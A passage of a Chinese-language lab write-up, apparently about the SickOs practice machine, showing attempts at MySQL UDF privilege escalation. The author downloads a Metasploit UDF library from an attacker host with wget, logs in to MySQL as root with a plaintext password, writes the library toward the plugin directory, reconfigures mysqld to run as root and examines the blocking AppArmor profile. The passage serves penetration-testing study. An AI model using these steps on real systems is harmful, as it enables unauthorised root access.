class="string">&#x27;USE_MOD_REWRITE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">// Add a suffix to pages (simluating static pages <span class="string">&#x27;.html&#x27;</span>)</span><br><span class="line">define(<span class="string">&#x27;URL_SUFFIX&#x27;</span>, <span class="string">&#x27;.html&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Set the timezone of your choice.</span><br><span class="line">// Go here <span class="keyword">for</span> more information on the available timezones:</span><br><span class="line">// http://php.net/timezones</span><br><span class="line">define(<span class="string">&#x27;DEFAULT_TIMEZONE&#x27;</span>, <span class="string">&#x27;Asia/Calcutta&#x27;</span>);</span><br><span class="line"></span><br><span class="line">// Use poormans cron solution instead of real one.</span><br><span class="line">// Only use <span class="keyword">if</span> cron is truly not available, this works better <span class="keyword">in</span> terms of timing</span><br><span class="line">// <span class="keyword">if</span> you have a lot of traffic.</span><br><span class="line">define(<span class="string">&#x27;USE_POORMANSCRON&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">// Rough interval <span class="keyword">in</span> seconds at <span class="built_in">which</span> poormans cron should trigger.</span><br><span class="line">// No traffic == no poormans cron run.</span><br><span class="line">define(<span class="string">&#x27;POORMANSCRON_INTERVAL&#x27;</span>, 3600);</span><br><span class="line"></span><br><span class="line">// How long should the browser remember logged <span class="keyword">in</span> user?</span><br><span class="line">// This relates to Login screen <span class="string">&quot;Remember me for xxx time&quot;</span> checkbox at Backend Login screen</span><br><span class="line">// Default: 1800 (30 minutes)</span><br><span class="line">define (<span class="string">&#x27;COOKIE_LIFE&#x27;</span>, 1800);  // 30 minutes</span><br><span class="line"></span><br><span class="line">// Can registered <span class="built_in">users</span> login to backend using their email address?</span><br><span class="line">// Default: <span class="literal">false</span></span><br><span class="line">define (<span class="string">&#x27;ALLOW_LOGIN_WITH_EMAIL&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">// Should Wolf CMS block login ability on invalid password provided?</span><br><span class="line">// Default: <span class="literal">true</span></span><br><span class="line">define (<span class="string">&#x27;DELAY_ON_INVALID_LOGIN&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">// How long should the login blockade last?</span><br><span class="line">// Default: 30 seconds</span><br><span class="line">define (<span class="string">&#x27;DELAY_ONCE_EVERY&#x27;</span>, 30); // 30 seconds</span><br><span class="line"></span><br><span class="line">// First delay starts after Nth failed login attempt</span><br><span class="line">// Default: 3</span><br><span class="line">define (<span class="string">&#x27;DELAY_FIRST_AFTER&#x27;</span>, 3);</span><br><span class="line"></span><br><span class="line">// Secure token expiry time (prevents CSRF attacks, etc.)</span><br><span class="line">// If backend user does nothing <span class="keyword">for</span> this time (eg. click some <span class="built_in">link</span>) </span><br><span class="line">// his token will expire with appropriate notification</span><br><span class="line">// Default: 900 (15 minutes)</span><br><span class="line">define (<span class="string">&#x27;SECURE_TOKEN_EXPIRY&#x27;</span>, 900);  // 15 minutes</span><br><span class="line">www-data@SickOs:/var/www/wolfcms$ </span><br></pre></td></tr></table></figure>
<p>查询 UDF 提权条件，看结果似乎是可以提权的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/var/www/wolfcms$ <span class="built_in">cd</span> /tmp/</span><br><span class="line">www-data@SickOs:/tmp$ </span><br><span class="line">www-data@SickOs:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 8</span><br><span class="line">drwxrwxrwt  2 root root 4096 Oct 19 10:23 .</span><br><span class="line">drwxr-xr-x 22 root root 4096 Sep 22  2015 ..</span><br><span class="line">www-data@SickOs:/tmp$ </span><br><span class="line">www-data@SickOs:/tmp$ wget http://192.168.159.174:8000/lib_mysqludf_sys_32.so</span><br><span class="line">--2024-10-19 10:24:36--  http://192.168.159.174:8000/lib_mysqludf_sys_32.so</span><br><span class="line">Connecting to 192.168.159.174:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5696 (5.6K) [application/octet-stream]</span><br><span class="line">Saving to: <span class="string">&#x27;lib_mysqludf_sys_32.so&#x27;</span></span><br><span class="line"></span><br><span class="line"> 0% [                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   100%[======================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================================&gt;] 5,696       --.-K/s   <span class="keyword">in</span> 0.02s   </span><br><span class="line"></span><br><span class="line">2024-10-19 10:24:36 (313 KB/s) - <span class="string">&#x27;lib_mysqludf_sys_32.so&#x27;</span> saved [5696/5696]</span><br><span class="line"></span><br><span class="line">www-data@SickOs:/tmp$ </span><br><span class="line">www-data@SickOs:/tmp$ <span class="built_in">ls</span> -al</span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwt  2 root     root     4096 Oct 19 10:24 .</span><br><span class="line">drwxr-xr-x 22 root     root     4096 Sep 22  2015 ..</span><br><span class="line">-rw-rw-rw-  1 www-data www-data 5696 Oct 18 14:42 lib_mysqludf_sys_32.so</span><br><span class="line">www-data@SickOs:/tmp$ </span><br><span class="line">www-data@SickOs:/tmp$ mysql -uroot -pjohn@123    </span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 51</span><br><span class="line">Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| wolf               |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.11 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; SELECT USER(), CURRENT_USER();</span><br><span class="line">+----------------+----------------+</span><br><span class="line">| USER()         | CURRENT_USER() |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">| root@localhost | root@localhost |</span><br><span class="line">+----------------+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW GRANTS;</span><br><span class="line">+----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| Grants <span class="keyword">for</span> root@localhost                                                                                                              |</span><br><span class="line">+----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">| GRANT ALL PRIVILEGES ON *.* TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY PASSWORD <span class="string">&#x27;*A7A20B93EC076311A63BF86B5C705B25C054DD77&#x27;</span> WITH GRANT OPTION |</span><br><span class="line">| GRANT PROXY ON <span class="string">&#x27;&#x27;</span>@<span class="string">&#x27;&#x27;</span> TO <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> WITH GRANT OPTION                                                                           |</span><br><span class="line">+----------------------------------------------------------------------------------------------------------------------------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT USER,FILE_PRIV FROM mysql.user;</span><br><span class="line">+------------------+-----------+</span><br><span class="line">| USER             | FILE_PRIV |</span><br><span class="line">+------------------+-----------+</span><br><span class="line">| root             | Y         |</span><br><span class="line">| root             | Y         |</span><br><span class="line">| root             | Y         |</span><br><span class="line">| root             | Y         |</span><br><span class="line">| debian-sys-maint | Y         |</span><br><span class="line">+------------------+-----------+</span><br><span class="line">5 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;SECURE_FILE_PRIV&#x27;</span>;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SHOW VARIABLES LIKE <span class="string">&#x27;PLUGIN_DIR&#x27;</span>;</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| Variable_name | Value                  |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">| plugin_dir    | /usr/lib/mysql/plugin/ |</span><br><span class="line">+---------------+------------------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.01 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
<p>注，lib_mysqludf_sys_32.so 取自
/usr/share/metasploit-framework/data/exploits/mysql/</p>
<p>尝试提权却失败了</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create table npn(line blob);</span><br><span class="line">ERROR 1050 (42S01): Table <span class="string">&#x27;npn&#x27;</span> already exists</span><br><span class="line">mysql&gt; </span><br><span class="line">mysql&gt; drop table npn;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create table npn(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into npn values(load_file(<span class="string">&#x27;/tmp/lib_mysqludf_sys_32.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from npn into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so&#x27;</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so<span class="string">&#x27; (Errcode: 13)</span></span><br><span class="line"><span class="string">mysql&gt; exit</span></span><br><span class="line"><span class="string">Bye</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
<p>往插件目录 <code>/usr/lib/mysql/plugin/</code> 导入
<code>lib_mysqludf_sys_32.so</code> 时失败了</p>
<p>进一步分析确定 MySQL 并非以 root
权限运行，推测可能是这个原因导致的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/tmp$ ps aux | grep mysql</span><br><span class="line">mysql     1027  0.0  3.4 326348 34932 ?        Ssl  10:15   0:01 /usr/sbin/mysqld</span><br><span class="line">www-data  1503  0.0  0.0   2308   560 pts/0    S+   10:45   0:00 grep mysql</span><br></pre></td></tr></table></figure>
<p>修改/etc/mysql/my.cnf 配置让 MySQL 以 root 运行试试</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld] </span><br><span class="line">user=root</span><br></pre></td></tr></table></figure>
<p>修改后重启 MySQL</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:~<span class="comment"># nano /etc/mysql/my.cnf </span></span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># ps aux | grep mysql</span></span><br><span class="line">mysql     1027  0.0  3.4 326348 34932 ?        Ssl  10:15   0:01 /usr/sbin/mysqld</span><br><span class="line">root      1889  0.0  0.0   4384   820 pts/2    S+   11:23   0:00 grep --color=auto mysql</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># systemctl restart mysqld</span></span><br><span class="line">systemctl: <span class="built_in">command</span> not found</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># service mysqld restart</span></span><br><span class="line">mysqld: unrecognized service</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># ls -al /etc/init.d/mysql </span></span><br><span class="line">lrwxrwxrwx 1 root root 21 Oct 23  2015 /etc/init.d/mysql -&gt; /lib/init/upstart-job</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># /etc/init.d/mysql restart</span></span><br><span class="line">Rather than invoking init scripts through /etc/init.d, use the service(8)</span><br><span class="line">utility, e.g. service mysql restart</span><br><span class="line"></span><br><span class="line">Since the script you are attempting to invoke has been converted to an</span><br><span class="line">Upstart job, you may also use the stop(8) and <span class="keyword">then</span> start(8) utilities,</span><br><span class="line">e.g. stop mysql ; start mysql. The restart(8) utility is also available.</span><br><span class="line">mysql stop/waiting</span><br><span class="line">mysql start/running, process 1954</span><br><span class="line">root@SickOs:~<span class="comment"># </span></span><br><span class="line">root@SickOs:~<span class="comment"># ps aux | grep mysql</span></span><br><span class="line">root      1954  0.5  3.3 326208 33972 ?        Ssl  11:26   0:00 /usr/sbin/mysqld</span><br><span class="line">root      2113  0.0  0.0   4380   820 pts/2    S+   11:26   0:00 grep --color=auto mysql</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>成功以 root 权限运行 MySQL 了，再次测试 UDF 提权依旧失败</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">www-data@SickOs:/tmp$ <span class="built_in">ls</span> -al                </span><br><span class="line">total 16</span><br><span class="line">drwxrwxrwt  2 root     root     4096 Oct 19 21:03 .</span><br><span class="line">drwxr-xr-x 22 root     root     4096 Sep 22  2015 ..</span><br><span class="line">-rw-rw-rw-  1 www-data www-data 5696 Oct 18 14:42 lib_mysqludf_sys_32.so</span><br><span class="line">www-data@SickOs:/tmp$ </span><br><span class="line">www-data@SickOs:/tmp$ mysql -uroot -pjohn@123</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 51</span><br><span class="line">Server version: 5.5.46-0ubuntu0.12.04.2 (Ubuntu)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2015, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; use mysql</span><br><span class="line">Reading table information <span class="keyword">for</span> completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; </span><br><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------+</span><br><span class="line">| Tables_in_mysql           |</span><br><span class="line">+---------------------------+</span><br><span class="line">| columns_priv              |</span><br><span class="line">| db                        |</span><br><span class="line">| event                     |</span><br><span class="line">| func                      |</span><br><span class="line">| general_log               |</span><br><span class="line">| help_category             |</span><br><span class="line">| help_keyword              |</span><br><span class="line">| help_relation             |</span><br><span class="line">| help_topic                |</span><br><span class="line">| host                      |</span><br><span class="line">| ndb_binlog_index          |</span><br><span class="line">| npn                       |</span><br><span class="line">| plugin                    |</span><br><span class="line">| proc                      |</span><br><span class="line">| procs_priv                |</span><br><span class="line">| proxies_priv              |</span><br><span class="line">| servers                   |</span><br><span class="line">| slow_log                  |</span><br><span class="line">| tables_priv               |</span><br><span class="line">| time_zone                 |</span><br><span class="line">| time_zone_leap_second     |</span><br><span class="line">| time_zone_name            |</span><br><span class="line">| time_zone_transition      |</span><br><span class="line">| time_zone_transition_type |</span><br><span class="line">| user                      |</span><br><span class="line">+---------------------------+</span><br><span class="line">25 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; drop table npn;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create table npn(line blob);</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into npn values(load_file(<span class="string">&#x27;/tmp/lib_mysqludf_sys_32.so&#x27;</span>));</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; <span class="keyword">select</span> * from npn into dumpfile <span class="string">&#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so&#x27;</span>;</span><br><span class="line">ERROR 1 (HY000): Can<span class="string">&#x27;t create/write to file &#x27;</span>/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so<span class="string">&#x27; (Errcode: 13)</span></span><br><span class="line"><span class="string">mysql&gt; select * from npn into outfile &#x27;</span>/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">ERROR 1 (HY000): Can&#x27;</span>t create/write to file <span class="string">&#x27;/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so&#x27;</span> (Errcode: 13)</span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
<p>进一步分析</p>
<ul>
<li>错误信息：<code>ERROR 1 (HY000): Can't create/write to file '/usr/lib/mysql/plugin/lib_mysqludf_sys_32.so' (Errcode: 13)</code></li>
<li>错误原因：由于Ubuntu版本的原因，有些版本在默认情况下是强制限制MySQL导出文件到除了MySQL的数据库文件（datadir）之外的其他路径。就是说，默认情况下只能导出到指定数据库文件。</li>
</ul>
<p>查看指定数据库文件路经命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show variables like <span class="string">&#x27;datadir&#x27;</span>;</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| Variable_name | Value           |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">| datadir       | /var/lib/mysql/ |</span><br><span class="line">+---------------+-----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>
<p>查看自己Ubuntu版本是否有上述强制限制：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment"># sudo aa-status</span></span><br><span class="line">apparmor module is loaded.</span><br><span class="line">5 profiles are loaded.</span><br><span class="line">5 profiles are <span class="keyword">in</span> enforce mode.</span><br><span class="line">   /sbin/dhclient</span><br><span class="line">   /usr/lib/NetworkManager/nm-dhcp-client.action</span><br><span class="line">   /usr/lib/connman/scripts/dhclient-script</span><br><span class="line">   /usr/sbin/mysqld  <span class="comment">#若存在该选项表示该版本存在默认强制限制</span></span><br><span class="line">   /usr/sbin/tcpdump</span><br><span class="line">0 profiles are <span class="keyword">in</span> complain mode.</span><br><span class="line">2 processes have profiles defined.</span><br><span class="line">2 processes are <span class="keyword">in</span> enforce mode.</span><br><span class="line">   /sbin/dhclient (914) </span><br><span class="line">   /usr/sbin/mysqld (2506) </span><br><span class="line">0 processes are <span class="keyword">in</span> complain mode.</span><br><span class="line">0 processes are unconfined but have a profile defined.</span><br><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<ul>
<li>解决方法：修改文件 <code>/etc/apparmor.d/usr.sbin.mysqld</code></li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment"># cat /etc/apparmor.d/usr.sbin.mysqld</span></span><br><span class="line"><span class="comment"># vim:syntax=apparmor</span></span><br><span class="line"><span class="comment"># Last Modified: Tue Jun 19 17:37:30 2007</span></span><br><span class="line"><span class="comment">#include &lt;tunables/global&gt;</span></span><br><span class="line"></span><br><span class="line">/usr/sbin/mysqld &#123;</span><br><span class="line">  <span class="comment">#include &lt;abstractions/base&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/nameservice&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/user-tmp&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/mysql&gt;</span></span><br><span class="line">  <span class="comment">#include &lt;abstractions/winbind&gt;</span></span><br><span class="line"></span><br><span class="line">  capability dac_override,</span><br><span class="line">  capability sys_resource,</span><br><span class="line">  capability setgid,</span><br><span class="line">  capability setuid,</span><br><span class="line"></span><br><span class="line">  network tcp,</span><br><span class="line"></span><br><span class="line">  /etc/hosts.allow r,</span><br><span class="line">  /etc/hosts.deny r,</span><br><span class="line"></span><br><span class="line">  /etc/mysql/*.pem r,</span><br><span class="line">  /etc/mysql/conf.d/ r,</span><br><span class="line">  /etc/mysql/conf.d/* r,</span><br><span class="line">  /etc/mysql/*.cnf r,</span><br><span class="line">  /usr/lib/mysql/plugin/ r,</span><br><span class="line">  /usr/lib/mysql/plugin/*.so* mr,</span><br><span class="line">  /usr/sbin/mysqld mr,</span><br><span class="line">  /usr/share/mysql/** r,</span><br><span class="line">  /var/log/mysql.log rw,</span><br><span class="line">  /var/log/mysql.err rw,</span><br><span class="line">  /var/lib/mysql/ r,</span><br><span class="line">  /var/lib/mysql/** rwk,</span><br><span class="line">  /var/log/mysql/ r,</span><br><span class="line">  /var/log/mysql/* rw,</span><br><span class="line">  /var/run/mysqld/mysqld.pid rw,</span><br><span class="line">  /var/run/mysqld/mysqld.sock w,</span><br><span class="line">  /run/mysqld/mysqld.pid rw,</span><br><span class="line">  /run/mysqld/mysqld.sock w,</span><br><span class="line"></span><br><span class="line">  /sys/devices/system/cpu/ r,</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Site-specific additions and overrides. See local/README for details.</span></span><br><span class="line">  <span class="comment">#include &lt;local/usr.sbin.mysqld&gt;</span></span><br><span class="line">&#125;</span><br><span class="line">root@SickOs:/usr/lib/mysql/plugin<span class="comment"># </span></span><br></pre></td></tr></table></figure>
<ul>
<li><code>/usr/lib/mysql/plugin/</code>
目录被允许读取（<code>r</code>），但没有写权限。这意味着 MySQL
